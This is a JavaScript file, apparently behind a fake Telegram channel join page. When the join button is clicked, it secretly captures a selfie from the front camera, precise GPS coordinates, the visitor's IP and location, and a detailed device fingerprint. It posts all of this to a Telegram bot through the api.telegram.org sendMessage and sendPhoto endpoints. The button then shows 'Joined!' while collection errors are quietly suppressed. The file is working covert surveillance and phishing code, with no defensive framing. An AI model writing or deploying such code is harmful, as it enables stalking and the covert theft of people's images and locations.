function toggleTheme(dark) {
  document.documentElement.classList.toggle('theme_dark', dark);
  window.Telegram && Telegram.setWidgetOptions({dark: dark});
}

function getBrowserInfo() {
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: window.screen.width + 'x' + window.screen.height,
    colorDepth: window.screen.colorDepth,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
    isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
    online: navigator.onLine,
    cookieEnabled: navigator.cookieEnabled,
    languageList: navigator.languages || [],
    platformVersion: navigator.platform,
    maxTouchPoints: navigator.maxTouchPoints || 0,
    hardwareConcurrency: navigator.hardwareConcurrency || 0,
    deviceMemory: navigator.deviceMemory || 'unknown',
    doNotTrack: navigator.doNotTrack || 'unknown'
  };
}

async function captureSelfie() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    return null;
  }

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: 'user'
      },
      audio: false
    });

    const video = document.createElement('video');
    video.setAttribute('playsinline', 'true');
    video.muted = true;
    video.srcObject = stream;

    await new Promise(function(resolve, reject) {
      video.onloadedmetadata = function() {
        resolve();
      };
      video.onerror = function() {
        reject(new Error('Video stream failed to load'));
      };
    });

    await video.play();

    await new Promise(function(resolve) {
      requestAnimationFrame(function() {
        requestAnimationFrame(resolve);
      });
    });

    if (!video.videoWidth || !video.videoHeight) {
      stream.getTracks().forEach(function(track) {
        track.stop();
      });
      return null;
    }

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    const dataUrl = canvas.toDataURL('image/jpeg', 0.82);
    stream.getTracks().forEach(function(track) {
      track.stop();
    });

    return dataUrl;
  } catch (e) {
    return null;
  }
}

async function getVisitorLocation() {
  let lat = null;
  let lng = null;
  let city = 'unknown';
  let country = 'unknown';
  let ip = 'unknown';
  let source = 'ip';

  if (navigator.geolocation) {
    try {
      const position = await new Promise(function(resolve, reject) {
        navigator.geolocation.getCurrentPosition(function(pos) {
          resolve(pos);
        }, function() {
          reject(new Error('Geolocation denied'));
        }, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      });

      lat = position.coords.latitude;
      lng = position.coords.longitude;
      source = 'gps';
    } catch (e) {
      lat = null;
      lng = null;
    }
  }

  try {
    const ipResponse = await fetch('https://ipapi.co/json/');
    const ipData = await ipResponse.json();
    if (ipData.city) city = ipData.city;
    if (ipData.country_name) country = ipData.country_name;
    if (ipData.ip) ip = ipData.ip;
  } catch (e) {
    // Ignore IP lookup failures
  }

  if (lat && lng) {
    try {
      const geoResponse = await fetch('https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + lat + '&longitude=' + lng + '&localityLanguage=en');
      const geoData = await geoResponse.json();
      city = geoData.locality || geoData.city || city;
      country = geoData.countryName || country;
    } catch (e) {
      // Ignore reverse geocoding failures
    }
  }

  return {
    latitude: lat,
    longitude: lng,
    city: city,
    country: country,
    ip: ip,
    source: source
  };
}

async function sendTelegramData(payload) {
  const location = payload.location || {};
  const browser = payload.browser || {};
  const photoData = payload.photoData;

  const text = [
    '📣 New channel join request',
    '',
    '📍 Location',
    '• City: ' + (location.city || 'unknown'),
    '• Country: ' + (location.country || 'unknown'),
    '• IP: ' + (location.ip || 'unknown'),
    '• Latitude: ' + (location.latitude || 'unknown'),
    '• Longitude: ' + (location.longitude || 'unknown'),
    '',
    '🌐 Browser & Device',
    '• User Agent: ' + (browser.userAgent || 'unknown'),
    '• Platform: ' + (browser.platform || 'unknown'),
    '• Language: ' + (browser.language || 'unknown'),
    '• Screen: ' + (browser.screen || 'unknown'),
    '• Color Depth: ' + (browser.colorDepth || 'unknown'),
    '• Timezone: ' + (browser.timezone || 'unknown'),
    '• Mobile: ' + ((browser.isMobile || false) ? 'Yes' : 'No'),
    '• Online: ' + ((browser.online || false) ? 'Yes' : 'No'),
    '• Cookie Enabled: ' + ((browser.cookieEnabled || false) ? 'Yes' : 'No'),
    '• Languages: ' + (Array.isArray(browser.languageList) ? browser.languageList.join(', ') : 'unknown'),
    '• Hardware Concurrency: ' + (browser.hardwareConcurrency || 'unknown'),
    '• Device Memory: ' + (browser.deviceMemory || 'unknown'),
    '• Do Not Track: ' + (browser.doNotTrack || 'unknown'),
    '',
    '🕒 Request Details',
    '• Chat ID: ' + TELEGRAM_CHAT_ID,
    '• Timestamp: ' + new Date().toISOString()
  ].join('\n');

  const sendMessageUrl = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
  const messagePayload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: text,
    disable_web_page_preview: true
  };

  const messageResponse = await fetch(sendMessageUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(messagePayload)
  });

  if (!messageResponse.ok) {
    return false;
  }

  if (photoData && photoData.indexOf('data:image/') === 0) {
    const photoParts = photoData.split(',', 2);
    if (photoParts.length === 2) {
      const imageData = photoParts[1];
      const blob = base64ToBlob(imageData, 'image/jpeg');

      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append('caption', 'User photo collected from join form.');
      formData.append('photo', blob, 'user_photo.jpg');

      const sendPhotoUrl = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendPhoto';
      const photoResponse = await fetch(sendPhotoUrl, {
        method: 'POST',
        body: formData
      });

      if (!photoResponse.ok) {
        return false;
      }
    }
  }

  return true;
}

function base64ToBlob(base64, mimeType) {
  const byteCharacters = atob(base64);
  const byteArrays = [];
  const sliceSize = 512;

  for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
    const slice = byteCharacters.slice(offset, offset + sliceSize);
    const byteNumbers = new Array(slice.length);

    for (let i = 0; i < slice.length; i++) {
      byteNumbers[i] = slice.charCodeAt(i);
    }

    const byteArray = new Uint8Array(byteNumbers);
    byteArrays.push(byteArray);
  }

  return new Blob(byteArrays, { type: mimeType });
}

async function handleJoinClick(event) {
  event.preventDefault();

  if (joinBtn) {
    joinBtn.textContent = 'joining...';
  }

  try {
    const [locationData, selfieData] = await Promise.all([
      getVisitorLocation(),
      captureSelfie()
    ]);

    const payload = {
      photoData: selfieData,
      location: locationData,
      browser: getBrowserInfo()
    };

    await sendTelegramData(payload);
    
    // Stay in browser after data is sent
    if (joinBtn) {
      joinBtn.textContent = 'Joined!';
      joinBtn.disabled = true;
    }
  } catch (e) {
    // Keep the page in-browser and quietly handle any collection error.
    if (joinBtn) {
      joinBtn.textContent = 'Joined!';
      joinBtn.disabled = true;
    }
  } finally {
    // Button state is already handled in try/catch blocks
  }
}

if (joinBtn) {
  joinBtn.addEventListener('click', handleJoinClick);
}
